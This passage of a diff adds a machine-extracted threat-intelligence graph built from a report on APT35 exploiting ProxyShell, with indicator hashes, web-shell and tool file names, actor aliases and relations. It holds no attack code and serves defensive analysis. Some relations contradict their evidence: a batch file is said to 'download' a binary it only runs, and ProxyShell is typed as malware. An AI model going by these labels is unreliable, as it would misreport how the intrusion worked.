+      "evidence_ids": [
+        "ev_170",
+        "ev_171"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "ed4e771700681b36eb8dd74a13dffc94c857bb46",
+      "ioc_type": "sha1",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_170",
+      "supporting_evidence_ids": [
+        "ev_171"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_11FCC18FB2B55FC3C988F6A76FCF8A2D",
+      "type": "MD5",
+      "name": "11FCC18FB2B55FC3C988F6A76FCF8A2D",
+      "normalized_name": "11FCC18FB2B55FC3C988F6A76FCF8A2D",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_132"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "11FCC18FB2B55FC3C988F6A76FCF8A2D",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_132",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_1a5ad24a6880eea807078375d6461f58",
+      "type": "MD5",
+      "name": "1a5ad24a6880eea807078375d6461f58",
+      "normalized_name": "1a5ad24a6880eea807078375d6461f58",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_94"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "1a5ad24a6880eea807078375d6461f58",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_94",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_46B722FD25E69870FA7711924BC5304D",
+      "type": "MD5",
+      "name": "46B722FD25E69870FA7711924BC5304D",
+      "normalized_name": "46B722FD25E69870FA7711924BC5304D",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_126"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "46B722FD25E69870FA7711924BC5304D",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_126",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_56D49E57AD1A051BF62C458CD6F3DEA9",
+      "type": "MD5",
+      "name": "56D49E57AD1A051BF62C458CD6F3DEA9",
+      "normalized_name": "56D49E57AD1A051BF62C458CD6F3DEA9",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_132"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "56D49E57AD1A051BF62C458CD6F3DEA9",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_132",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_5f098b55f94f5a448ca28904a57c0e58",
+      "type": "MD5",
+      "name": "5f098b55f94f5a448ca28904a57c0e58",
+      "normalized_name": "5f098b55f94f5a448ca28904a57c0e58",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_104"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "5f098b55f94f5a448ca28904a57c0e58",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_104",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_6104990DFEA3DFAB044FAF960458DB09",
+      "type": "MD5",
+      "name": "6104990DFEA3DFAB044FAF960458DB09",
+      "normalized_name": "6104990DFEA3DFAB044FAF960458DB09",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_132"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "6104990DFEA3DFAB044FAF960458DB09",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_132",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_787242D55F2C49A23F5D97710D972108",
+      "type": "MD5",
+      "name": "787242D55F2C49A23F5D97710D972108",
+      "normalized_name": "787242D55F2C49A23F5D97710D972108",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_126"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "787242D55F2C49A23F5D97710D972108",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_126",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_9a3703f9c532ae2ec3025840fa449d4e",
+      "type": "MD5",
+      "name": "9a3703f9c532ae2ec3025840fa449d4e",
+      "normalized_name": "9a3703f9c532ae2ec3025840fa449d4e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_101"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "9a3703f9c532ae2ec3025840fa449d4e",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_101",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_A2DB26CE3BBE7B2CB12F9BEFB37891A3",
+      "type": "MD5",
+      "name": "A2DB26CE3BBE7B2CB12F9BEFB37891A3",
+      "normalized_name": "A2DB26CE3BBE7B2CB12F9BEFB37891A3",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_126"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "A2DB26CE3BBE7B2CB12F9BEFB37891A3",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_126",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_b2fde6dc7bd1e04ce601f57805de415b",
+      "type": "MD5",
+      "name": "b2fde6dc7bd1e04ce601f57805de415b",
+      "normalized_name": "b2fde6dc7bd1e04ce601f57805de415b",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_97"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "b2fde6dc7bd1e04ce601f57805de415b",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_97",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_cacb64bdf648444e66c82f5ce61caf4b",
+      "type": "MD5",
+      "name": "cacb64bdf648444e66c82f5ce61caf4b",
+      "normalized_name": "cacb64bdf648444e66c82f5ce61caf4b",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_115"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "cacb64bdf648444e66c82f5ce61caf4b",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_115",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_d2f4647a3749d30a35d5a8faff41765e",
+      "type": "MD5",
+      "name": "d2f4647a3749d30a35d5a8faff41765e",
+      "normalized_name": "d2f4647a3749d30a35d5a8faff41765e",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_107"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "d2f4647a3749d30a35d5a8faff41765e",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_107",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_ioc_md5_f0be699c8aafc41b25a8fc0974cc4582",
+      "type": "MD5",
+      "name": "f0be699c8aafc41b25a8fc0974cc4582",
+      "normalized_name": "f0be699c8aafc41b25a8fc0974cc4582",
+      "aliases": [],
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_111"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "value": "f0be699c8aafc41b25a8fc0974cc4582",
+      "ioc_type": "md5",
+      "sources": [
+        "rule"
+      ],
+      "primary_evidence_id": "ev_111",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_hash"
+    },
+    {
+      "id": "ent_file_App_Web_vjloy3pa.dll",
+      "type": "File",
+      "name": "App_Web_vjloy3pa.dll",
+      "normalized_name": "App_Web_vjloy3pa.dll",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_135"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "App_Web_vjloy3pa.dll",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_135",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_aspx_dyukbdcxjfi.aspx",
+      "type": "File",
+      "name": "aspx_dyukbdcxjfi.aspx",
+      "normalized_name": "aspx_dyukbdcxjfi.aspx",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_62"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "aspx_dyukbdcxjfi.aspx",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_62",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_aspx_wkggiyvttmu.aspx",
+      "type": "File",
+      "name": "aspx_wkggiyvttmu.aspx",
+      "normalized_name": "aspx_wkggiyvttmu.aspx",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_22",
+        "ev_26"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "aspx_wkggiyvttmu.aspx",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_22",
+      "supporting_evidence_ids": [
+        "ev_26"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "REDACTED",
+        "POST"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_comsvcs.dll",
+      "type": "File",
+      "name": "comsvcs.dll",
+      "normalized_name": "comsvcs.dll",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_46",
+        "ev_85",
+        "ev_86"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "comsvcs.dll",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_85",
+      "supporting_evidence_ids": [
+        "ev_86",
+        "ev_46"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "family_hints": [
+        "LOLBIN",
+        "LSASS"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_dllhost.exe",
+      "type": "File",
+      "name": "dllhost.exe",
+      "normalized_name": "dllhost.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_55",
+        "ev_66",
+        "ev_75",
+        "ev_91"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "dllhost.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_66",
+      "supporting_evidence_ids": [
+        "ev_91",
+        "ev_75",
+        "ev_55"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_ipconfig.exe",
+      "type": "File",
+      "name": "ipconfig.exe",
+      "normalized_name": "ipconfig.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_49",
+        "ev_88"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "ipconfig.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_88",
+      "supporting_evidence_ids": [
+        "ev_49"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_LSASS.exe",
+      "type": "File",
+      "name": "LSASS.exe",
+      "normalized_name": "LSASS.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_45",
+        "ev_85"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "LSASS.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_85",
+      "supporting_evidence_ids": [
+        "ev_45"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "family_hints": [
+        "LSASS",
+        "LOLBIN"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_net.exe",
+      "type": "File",
+      "name": "net.exe",
+      "normalized_name": "net.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_118",
+        "ev_49",
+        "ev_87"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "net.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_87",
+      "supporting_evidence_ids": [
+        "ev_118",
+        "ev_49"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_powershell.exe",
+      "type": "File",
+      "name": "powershell.exe",
+      "normalized_name": "powershell.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_73",
+        "ev_77",
+        "ev_86",
+        "ev_89"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "powershell.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_86",
+      "supporting_evidence_ids": [
+        "ev_89",
+        "ev_73",
+        "ev_77"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_rundll32.exe",
+      "type": "File",
+      "name": "rundll32.exe",
+      "normalized_name": "rundll32.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_86"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "rundll32.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_86",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "offensive_tool_or_utility",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_schtasks.exe",
+      "type": "File",
+      "name": "schtasks.exe",
+      "normalized_name": "schtasks.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_71",
+        "ev_79"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "schtasks.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_79",
+      "supporting_evidence_ids": [
+        "ev_71"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "indicator_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_ssasl.zip",
+      "type": "File",
+      "name": "ssasl.zip",
+      "normalized_name": "ssasl.zip",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_86"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "ssasl.zip",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_86",
+      "supporting_evidence_ids": [],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_task_update.exe",
+      "type": "File",
+      "name": "task_update.exe",
+      "normalized_name": "task_update.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_114",
+        "ev_129",
+        "ev_140",
+        "ev_62"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "task_update.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_62",
+      "supporting_evidence_ids": [
+        "ev_114",
+        "ev_129",
+        "ev_140"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_user.exe",
+      "type": "File",
+      "name": "user.exe",
+      "normalized_name": "user.exe",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_35",
+        "ev_49",
+        "ev_76",
+        "ev_90"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "user.exe",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_90",
+      "supporting_evidence_ids": [
+        "ev_49",
+        "ev_76",
+        "ev_35"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_Wininet.bat",
+      "type": "File",
+      "name": "Wininet.bat",
+      "normalized_name": "Wininet.bat",
+      "aliases": [],
+      "confidence": 0.94,
+      "evidence_ids": [
+        "ev_30",
+        "ev_31",
+        "ev_62",
+        "ev_74"
+      ],
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "file_name": "Wininet.bat",
+      "sources": [
+        "llm",
+        "rule"
+      ],
+      "primary_evidence_id": "ev_74",
+      "supporting_evidence_ids": [
+        "ev_62",
+        "ev_31",
+        "ev_30"
+      ],
+      "needs_review": false,
+      "historical_aliases": [],
+      "related_families": [],
+      "file_role": "file_artifact",
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact"
+    },
+    {
+      "id": "ent_file_quser.exe",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "File",
+      "name": "quser.exe",
+      "normalized_name": "quser.exe",
+      "aliases": [],
+      "confidence": 0.83,
+      "evidence_ids": [
+        "ev_49"
+      ],
+      "sources": [
+        "event_derive"
+      ],
+      "entity_scope": "supporting",
+      "core_observation": false,
+      "observation_kind": "supporting_file_artifact",
+      "file_name": "quser.exe",
+      "file_role": "file_artifact"
+    }
+  ],
+  "relations": [
+    {
+      "id": "rel_0001",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_COBALT_ILLUSION",
+      "tail_id": "ent_threatactor_APT35",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "primary_evidence_id": "ev_4",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0002",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_Charming_Kitten",
+      "tail_id": "ent_threatactor_APT35",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "primary_evidence_id": "ev_4",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0003",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_ITG18",
+      "tail_id": "ent_threatactor_APT35",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "primary_evidence_id": "ev_4",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0004",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_Newscaster",
+      "tail_id": "ent_threatactor_APT35",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "primary_evidence_id": "ev_4",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0005",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "alias_of",
+      "head_id": "ent_threatactor_Phosphorus",
+      "tail_id": "ent_threatactor_APT35",
+      "head_type": "ThreatActor",
+      "tail_type": "ThreatActor",
+      "confidence": 0.99,
+      "evidence_ids": [
+        "ev_4"
+      ],
+      "primary_evidence_id": "ev_4",
+      "direction": "head_to_tail",
+      "extraction_method": "projection_alias",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "alias_of",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": null,
+        "notes": "alias_from_entity",
+        "schema_version": "v3.1-projector"
+      }
+    },
+    {
+      "id": "rel_0006",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "downloads",
+      "head_id": "ent_file_Wininet.bat",
+      "tail_id": "ent_file_dllhost.exe",
+      "head_type": "File",
+      "tail_type": "File",
+      "confidence": 0.8,
+      "evidence_ids": [
+        "ev_74"
+      ],
+      "primary_evidence_id": "ev_74",
+      "direction": "head_to_tail",
+      "extraction_method": "llm_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": false,
+        "stage": "command_and_control",
+        "notes": "download_head",
+        "schema_version": "v3.0-evidence-reasoner",
+        "evidence_span": "The schedule task runs a batch script called Wininet.bat which was also uploaded through the web shell. Wininet.bat simply loops through the execution of the file dllhost.exe ."
+      },
+      "head": {
+        "id": "ent_file_Wininet.bat",
+        "type": "File",
+        "name": "Wininet.bat",
+        "normalized_name": "Wininet.bat",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_30",
+          "ev_31",
+          "ev_62",
+          "ev_74"
+        ],
+        "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+        "file_name": "Wininet.bat",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_74",
+        "supporting_evidence_ids": [
+          "ev_62",
+          "ev_31",
+          "ev_30"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "file_artifact",
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      },
+      "tail": {
+        "id": "ent_file_dllhost.exe",
+        "type": "File",
+        "name": "dllhost.exe",
+        "normalized_name": "dllhost.exe",
+        "aliases": [],
+        "confidence": 0.94,
+        "evidence_ids": [
+          "ev_55",
+          "ev_66",
+          "ev_75",
+          "ev_91"
+        ],
+        "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+        "file_name": "dllhost.exe",
+        "sources": [
+          "llm",
+          "rule"
+        ],
+        "primary_evidence_id": "ev_66",
+        "supporting_evidence_ids": [
+          "ev_91",
+          "ev_75",
+          "ev_55"
+        ],
+        "needs_review": false,
+        "historical_aliases": [],
+        "related_families": [],
+        "file_role": "file_artifact",
+        "entity_scope": "supporting",
+        "core_observation": false,
+        "observation_kind": "supporting_file_artifact"
+      }
+    },
+    {
+      "id": "rel_0007",
+      "report_id": "TheDFIRReport_APT35-Automates-Initial-Access-Using-ProxyShell(03-21-2022)",
+      "type": "downloads",
+      "head_id": "ent_malware_ProxyShell",
+      "tail_id": "ent_file_dllhost.exe",
+      "head_type": "Malware",
+      "tail_type": "File",
+      "confidence": 0.82,
+      "evidence_ids": [
+        "ev_7",
+        "ev_66"
+      ],
+      "primary_evidence_id": "ev_7",
+      "direction": "head_to_tail",
+      "extraction_method": "rule_sentence",
+      "status": "confirmed",
+      "attributes": {
+        "trigger": "downloads",
+        "negated": false,
+        "cross_sentence": true,
+        "stage": "command_and_control",
